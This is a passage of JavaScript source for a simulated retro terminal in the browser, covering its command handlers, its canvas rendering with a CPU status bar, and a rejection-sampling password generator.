          t.print(`${String(i + 1).padStart(3)}  ${d.proto.padEnd(5)}  ${d.src.padEnd(13)}  ${d.dst.padEnd(13)}  ${d.info}${d.ok ? '' : ' [BAD CHECKSUM]'}`, c.fg);
          if (i === n - 1) hexdump(f, 48).forEach((l) => t.print('     ' + l, c.dim));
        }
        t.print('(last frame shown as hex; IPv4 header checksum verified per RFC 1071)', c.dim);
      },

      // ---- room
      buddy(_, rest) { t.print('EngineBuddy: ' + buddyReply(rest), c.purple); },
      gpu(args) { const m = sys.setGpuMode(args[0]); t.print(`GPU screen shader: ${m}`, c.cyan); },
      lights() { const on = sys.toggleLights(); t.print(`room lights ${on ? 'on' : 'off'}`, c.cyan); },
    };
  }

  // ---------------------------------------------------------------- frame update / render

  flushOne() {
    const [text, color] = this.queue.shift();
    if (text === null) { this.mode = 'shell'; this.dirty = true; return; }
    this.print(text, color);
  }

  update(dt) {
    if (this.queue.length) {
      this.queueTimer -= dt * 1000;
      while (this.queue.length && this.queueTimer <= 0) {
        const delay = this.queue[0][2];
        this.flushOne();
        this.queueTimer += delay;
      }
    }
    this.blink += dt;
    this.statusTimer += dt;
    if (this.statusTimer > 0.25) { this.statusTimer = 0; this.dirty = true; }
    if (this.dirty) { this.render(); this.dirty = false; return true; }
    return false;
  }

  render() {
    const g = this.g;
    const W = this.canvas.width, H = this.canvas.height;
    g.fillStyle = COLORS.bg;
    g.fillRect(0, 0, W, H);
    g.font = `${this.fontSize}px "DejaVu Sans Mono", "Consolas", "Courier New", monospace`;
    g.textBaseline = 'top';

    // status bar
    const cpu = this.sys.cpu;
    g.fillStyle = '#0d2a1c';
    g.fillRect(0, 0, W, 34);
    g.fillStyle = COLORS.fg;
    const state = cpu.halted ? 'HALT' : 'RUN ';
    const now = new Date();
    const status = ` SecureRustOS tty0 | EG-8 ${state} ${this.sys.getHz()}Hz PC=${hex(cpu.pc)} SP=${hex(cpu.sp)} A=${hex(cpu.r[0])} | ${now.toTimeString().slice(0, 8)}`;
    g.fillText(status.slice(0, this.cols + 2), 20, 8);

    // text area
    const showPrompt = this.mode !== 'boot';
    const visible = this.rows - (showPrompt ? 1 : 0);
    const end = this.lines.length - this.scroll;
    const start = Math.max(0, end - visible);
    let y = 46;
    for (let i = start; i < end; i++) {
      const ln = this.lines[i];
      g.fillStyle = ln.color;
      g.shadowColor = ln.color;
      g.shadowBlur = 6;
      g.fillText(ln.text, this.margin, y);
      y += this.lineH;
    }
    g.shadowBlur = 0;
    if (showPrompt && this.scroll === 0) {
      const p = this.promptText();
      let full = p + this.input;
      let offset = 0;
      if (full.length > this.cols - 1) { offset = full.length - (this.cols - 1); full = full.slice(offset); }
      g.fillStyle = COLORS.white;
      g.fillText(full, this.margin, y);
      if (Math.floor(this.blink * 2) % 2 === 0) {
        const cx = this.margin + (p.length + this.cursor - offset) * this.cw;
        g.fillStyle = COLORS.fg;
        g.fillRect(cx, y + 2, this.cw, this.fontSize);
      }
    }
    if (this.scroll > 0) {
      g.fillStyle = COLORS.amber;
      g.fillText(`-- scrollback ${this.scroll} --`, W - 260, H - 30);
    }
  }
}

function regLine(cpu) {
  const r = cpu.r;
  return `A=${hex(r[0])} B=${hex(r[1])} C=${hex(r[2])} D=${hex(r[3])} PC=${hex(cpu.pc)} SP=${hex(cpu.sp)} [${cpu.Z ? 'Z' : '-'}${cpu.C ? 'C' : '-'}${cpu.N ? 'N' : '-'}]`;
}

export function generatePassword(pool, len) {
  const chars = [];
  for (let i = 33; i < 127; i++) chars.push(String.fromCharCode(i)); // 94 printable symbols
  let out = '';
  while (out.length < len) {
    const b = pool.byte();
    if (b < 188) out += chars[b % 94]; // rejection sampling: 188 = 2*94, avoids modulo bias
  }
  return out;
}
